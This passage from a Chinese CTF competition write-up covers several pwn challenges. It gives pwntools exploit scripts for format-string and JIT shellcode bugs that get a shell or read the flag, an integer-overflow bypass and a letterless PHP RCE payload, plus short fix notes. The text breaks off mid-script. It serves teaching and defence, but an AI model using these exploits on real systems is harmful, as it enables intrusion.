class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(error,stdout,stderr)</span> &#123;<span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(stdout)</span>&#125;);&#125;<span class="hljs-params">()</span>&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>利用目录穿越拿到flag</p><h2 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h2><p>提示：应修尽修，xss</p><p>没有修复成功</p><h1 id="pwn-ezwp"><a href="#pwn-ezwp" class="headerlink" title="pwn-ezwp"></a>pwn-ezwp</h1><h2 id="break-4"><a href="#break-4" class="headerlink" title="break"></a>break</h2><p>非预期：phpinfo中直接搜flag</p><p>预期解：</p><p>php.ini里可以看到引用了myphp.so</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">extension=/home/myphp.so<br></code></pre></td></tr></table></figure><p>ida分析</p><p>进入<code>get_module</code>函数，通过扩展函数表，可以看到<code>myphp.so</code>扩展导出了三个函数: myphp_test1,myphp_test2,phppwn</p><p><img src="/img/wp/2024/2024ciscn-ezwp_break_1.png"></p><p>进入<code>phppwn</code>，发现会验证密钥后读取flag输出</p><p>但是这里<code>len</code>的类型是<code>unsigned __int8</code>，所以<code>len=strlen(arg)&amp;0xff</code>。同时密钥长度32，限制长度24，可以使用整数溢出进行绕过</p><p><img src="/img/wp/2024/2024ciscn-ezwp_break_2.png"></p><p>exp</p><p>字符串长度&amp;0xff&lt;0x18 即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><p>加上无字母rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">phppwn</span>(<span class="hljs-string">&quot;hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>F%<span class="hljs-number">88</span>%<span class="hljs-number">91</span>)(~%<span class="hljs-number">97</span>%A9%<span class="hljs-number">86</span>%<span class="hljs-number">92</span>%<span class="hljs-number">94</span>%B1%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%CF%B1%B2%CF%B1%<span class="hljs-number">9</span>C%A6%BC%<span class="hljs-number">8</span>C%<span class="hljs-number">88</span>%B1%<span class="hljs-number">8</span>B%B9%<span class="hljs-number">9</span>D%AA%A5%<span class="hljs-number">8</span>A%B8%CE%B8%A7%<span class="hljs-number">9</span>D%<span class="hljs-number">88</span>%AA%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E);<br></code></pre></td></tr></table></figure><h2 id="fix-4"><a href="#fix-4" class="headerlink" title="fix"></a>fix</h2><p>应该是需要修改字符串长度比较类型为长整型</p><h1 id="pwn-cJSON"><a href="#pwn-cJSON" class="headerlink" title="pwn-cJSON"></a>pwn-cJSON</h1><h2 id="break-5"><a href="#break-5" class="headerlink" title="break"></a>break</h2><p>在delete功能中存在格式化字符串，利用格式化字符串可以获取shell</p><p><img src="/img/wp/2024/2024ciscn-cJSON-BREAK_1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">all</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;len:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>p=remote(<span class="hljs-string">&quot;10.1.123.16&quot;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp $rebase(0x6b3b)&#x27;)</span><br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc&quot;)</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>offset=<span class="hljs-number">20</span><br>code=&#123;<span class="hljs-string">&quot;%25$p&quot;</span>:<span class="hljs-number">1</span>&#125;<br>payload=json.dumps(code)<br>p.sendlineafter(<span class="hljs-string">b&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;Json:&#x27;</span>,payload.encode())<br>free(<span class="hljs-string">&quot;%27$p&quot;</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>libc.address=d-<span class="hljs-number">0x24083</span><br><span class="hljs-comment">#libc.address=d-0x29d90</span><br>free(<span class="hljs-string">&quot;%11$p&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>e.address=d-<span class="hljs-number">0x6b04</span><br><br>free(<span class="hljs-string">&quot;%10$p&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>mainstack=d+<span class="hljs-number">8</span><br>stack=d-<span class="hljs-number">0x78</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>rdi=e.address+<span class="hljs-number">0x0000000000006ba3</span><br>ret=rdi+<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(mainstack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rdi))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ret))<br>payload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(payload):<br>    <span class="hljs-keyword">if</span> v==<span class="hljs-number">0</span>:<br>        data=<span class="hljs-string">&quot;%22$hhn&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        data=(<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(v)+<span class="hljs-string">&quot;c%&quot;</span>+<span class="hljs-string">&quot;22$hhn&quot;</span>)<br>    data=data.encode().ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(mainstack+i)<br>    <span class="hljs-built_in">print</span>(data)<br>    free(data)<br>retaddr=e.address+<span class="hljs-number">0x6b3a</span><br>free((<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(retaddr&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-string">&quot;c%&quot;</span>+<span class="hljs-string">&quot;22$hn&quot;</span>).encode().ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(stack))<br><br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="fix-5"><a href="#fix-5" class="headerlink" title="fix"></a>fix</h2><p>将delete功能中的printf函数修改为puts</p><p><img src="/img/wp/2024/2024ciscn-cJS0N-FIX_1.png"></p><p>在edit功能中可能存在栈溢出，修改memcpy的第三个参数</p><p><img src="/img/wp/2024/2024ciscn-cJS0N-FIX_2.png"></p><h1 id="pwn-baby-jit"><a href="#pwn-baby-jit" class="headerlink" title="pwn-baby_jit"></a>pwn-baby_jit</h1><h2 id="break-6"><a href="#break-6" class="headerlink" title="break"></a>break</h2><p>shellcode中有8字节是自定义的,利用这8字节进行二次写，实现orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>():<br>    <span class="hljs-keyword">pass</span><br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;xor rdi,rdi</span><br><span class="hljs-string">xchg rsi,rdx</span><br><span class="hljs-string">syscall&quot;&quot;&quot;</span><br><br>p=remote(<span class="hljs-string">&quot;10.1.123.17&quot;</span>,<span class="hljs-number">9999</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;add &quot;</span>+<span class="hljs-built_in">str</span>(u64(asm(shellcode))))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&quot;add &quot;</span>+<span class="hljs-built_in">str</span>(u64(asm(shellcode))))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;offset?&#x27;</span>,<span class="hljs-string">&#x27;0.2&#x27;</span>)<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x100000</span>+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x100000</span>+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="fix-6"><a href="#fix-6" class="headerlink" title="fix"></a>fix</h2><p>尝试了 修改指令单位大小，不使用浮点数进行偏移 没有防御成功</p><h1 id="pwn-printf-master"><a href="#pwn-printf-master" class="headerlink" title="pwn-printf-master"></a>pwn-printf-master</h1><h2 id="break-7"><a href="#break-7" class="headerlink" title="break"></a>break</h2><p>利用栈中指向args和envs的指针数据修改printf函数返回地址，进行多次格式化字符串，最终修改printf的返回地址为gadget获得shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p</span>):<br>    libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>    gadget=<span class="hljs-number">0xe6af1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br>    gdb.attach(p,<span class="hljs-string">&#x27;bp $rebase(0x1635)&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;gift:&#x27;</span>)<br>    stack=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)<br>    print_stack=stack-<span class="hljs-number">0x18</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(print_stack))<br>    payload=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">14</span><br>    payload+=<span class="hljs-string">&quot;%p&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(print_stack-<span class="hljs-number">14</span>-<span class="hljs-number">14</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hn&#x27;</span><br>    data=<span class="hljs-number">0xa9</span><br>    subdata=(print_stack+<span class="hljs-number">26</span>)&amp;<span class="hljs-number">0xff</span><br>    data=data+<span class="hljs-number">0x100</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">26</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&quot;%hhn&quot;</span><br><span class="hljs-comment">#    p.sendline(&#x27;%p &#x27;*80)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;name?&#x27;</span>,payload)<br>    p.readuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>    libc.address=<span class="hljs-built_in">int</span>(p.read(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x270b3</span><br>    gadget=libc.address+gadget <span class="hljs-comment">#3601</span><br>    <span class="hljs-comment">#libc.address=int(p.read(12),16)-0x24083</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-comment">#    p.sendline(&#x27;%p &#x27;*60)</span><br><span class="hljs-comment">#    p.interactive()</span><br>    print_stack=print_stack-<span class="hljs-number">0x30</span><br><br><br>    data=print_stack-<span class="hljs-number">0x30</span><br>    payload=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(data-<span class="hljs-number">8</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hn&#x27;</span><br><br>    data=print_stack<br>    subdata=print_stack-<span class="hljs-number">0x30</span>+<span class="hljs-number">11</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">11</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hn&#x27;</span><br><br><br>    data=print_stack+<span class="hljs-number">4</span>-<span class="hljs-number">0x30</span><br>    subdata=(print_stack+<span class="hljs-number">14</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">10</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br>    <br>    data=<span class="hljs-number">0xa9</span><br>    subdata=(print_stack+<span 